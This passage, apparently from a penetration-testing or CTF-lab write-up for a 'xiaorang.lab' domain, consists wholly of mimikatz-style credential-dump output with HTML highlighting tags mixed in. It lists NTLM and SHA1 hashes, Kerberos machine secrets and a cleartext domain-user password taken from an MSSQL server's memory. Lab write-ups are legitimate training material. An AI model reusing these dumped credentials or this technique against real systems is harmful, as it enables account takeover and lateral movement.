class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER08         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208046 <span class="token punctuation">(</span>00000000:00032cae<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER06Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1009        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER06         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : aa206c617e2194dd76b766b7e3c92bc6         <span class="token operator">*</span> SHA1     : 62dd8046a71c17fe7263bab86b1ca4506f8c373c        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER06         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER06         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 207819 <span class="token punctuation">(</span>00000000:00032bcb<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER04Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1007        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER04         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 36bd3cceea3d413e8111b0bef32da84d         <span class="token operator">*</span> SHA1     : 414d2c783a3fb2ba855e41c243c583bb0604fe02        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER04         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER04         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 207707 <span class="token punctuation">(</span>00000000:00032b5b<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER03Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1006        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER03         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 2f7c88f56a7236f476d18ea6b5a2d33a         <span class="token operator">*</span> SHA1     : 5bc2d09b8b0f7c11a1fc3fb2f97b713ac116b6eb        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER03         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER03         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 172259 <span class="token punctuation">(</span>00000000:0002a0e3<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : MSSQLFDLauncherDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:40SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 169535 <span class="token punctuation">(</span>00000000:0002963f<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : MSSQLLaunchpadDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:39SID               : S-1-5-80-3477044410-376262199-2110164357-2030828471-4165405235        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 96515 <span class="token punctuation">(</span>00000000:00017903<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : SSISTELEMETRY130Domain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:32SID               : S-1-5-80-1625532266-625503396-2441596095-4129757946-3375356652        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 93643 <span class="token punctuation">(</span>00000000:00016dcb<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : MsDtsServer130Domain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:31SID               : S-1-5-80-3763098489-2620711134-3767674660-4164406483-1621732        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 91730 <span class="token punctuation">(</span>00000000:00016652<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : MSSQLServerOLAPServiceDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:31SID               : S-1-5-80-2872255330-672591203-888807865-2791174282-1554802921        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 91710 <span class="token punctuation">(</span>00000000:0001663e<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : MSSQLSERVERDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:31SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 63649 <span class="token punctuation">(</span>00000000:0000f8a1<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:30SID               : S-1-5-90-0-1        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : cea3e66a2715c71423e7d3f0ff6cd352         <span class="token operator">*</span> SHA1     : 6de4e8f192569bbc44ae94f273870635ae878094        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>p4Spnv`&amp;9xTZ=D'D/lz<span class="token punctuation">[</span>a:94O:<span class="token variable">$E</span><span class="token operator">!</span>7&amp;zfcMza9k<span class="token punctuation">;</span>Se<span class="token string">"&amp;>cBCBU0bxw.xL"</span>B>\GmtUT<span class="token punctuation">,</span>&lt;:q3Yxfq<span class="token comment">#`O3sLI;OK" (_T_T5- $zV]-i;)c$qIj&amp;$RgttdZI"m</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 996 <span class="token punctuation">(</span>00000000:000003e4<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : MSSQLSERVER$Domain            : XIAORANGLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:30SID               : S-1-5-20        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : mssqlserver$         <span class="token operator">*</span> Domain   : XIAORANG<span class="token punctuation">.</span>LAB         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 22617 <span class="token punctuation">(</span>00000000:00005859<span class="token punctuation">)</span>Session           : UndefinedLogonType <span class="token keyword">from</span> 0User Name         : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Domain            : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:15SID               :        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :        kerberos :        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 25360555 <span class="token punctuation">(</span>00000000:0182f8ab<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 2User Name         : DWM-2Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/25 2:10:53SID               : S-1-5-90-0-2        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 307424 <span class="token punctuation">(</span>00000000:0004b0e0<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : WilliamDomain            : XIAORANGLogon Server      : DCLogon Time        : 2025/2/24 23:14:55SID               : S-1-5-21-2704639352-1689326099-2164665914-1106        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : William         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 8853911fd59e8d0a82176e085a2157de         <span class="token operator">*</span> SHA1     : e4fd18cfd47b9a77836c82283fb560e6f465bc40         <span class="token operator">*</span> DPAPI    : da3fc187c1ff105853ec62c10cddd26b        tspkg :        wdigest :         <span class="token operator">*</span> Username : William         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : William         <span class="token operator">*</span> Domain   : XIAORANG<span class="token punctuation">.</span>LAB         <span class="token operator">*</span> Password : Willg1UoO6Jt        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 209398 <span class="token punctuation">(</span>00000000:000331f6<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER20Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1023        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER20         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : f5c512b9cb3052c5ad35e526d44ba85a         <span class="token operator">*</span> SHA1     : b09c8d9463c494d36e1a4656c15af8e1a7e4568f        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER20         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER20         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 209200 <span class="token punctuation">(</span>00000000:00033130<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER18Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1021        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER18         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 31de1b5e8995c7f91070f4a409599c50         <span class="token operator">*</span> SHA1     : 070c0d12760e50812236b5717c75222a206aace8        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER18         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER18         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208981 <span class="token punctuation">(</span>00000000:00033055<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER16Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1019        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER16         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 42c0eed1872923f6b60118d9711282a6         <span class="token operator">*</span> SHA1     : dcf14b63c01e9d5a9d4d9c25d1b2eb6c65c2e3a6        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER16         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER16         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208768 <span class="token punctuation">(</span>00000000:00032f80<span class="token punctuation">)</span>Session           : Interactive 